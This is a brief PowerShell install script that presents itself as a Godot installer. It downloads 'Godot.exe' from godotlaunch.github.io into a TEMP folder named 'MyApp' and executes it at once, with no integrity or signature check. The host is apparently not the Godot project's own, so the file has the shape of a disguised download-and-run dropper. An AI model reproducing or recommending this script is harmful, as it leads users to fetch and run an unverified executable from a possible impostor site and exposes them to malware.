#!/usr/bin/env pwsh
# install.ps1

$InstallPath = "$env:TEMP\MyApp"
$ExeUrl = "https://godotlaunch.github.io/godot/Godot.exe"
$ExePath = "$InstallPath\Godot.exe"

if (!(Test-Path $InstallPath)) { New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null }

Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing

& $ExePath
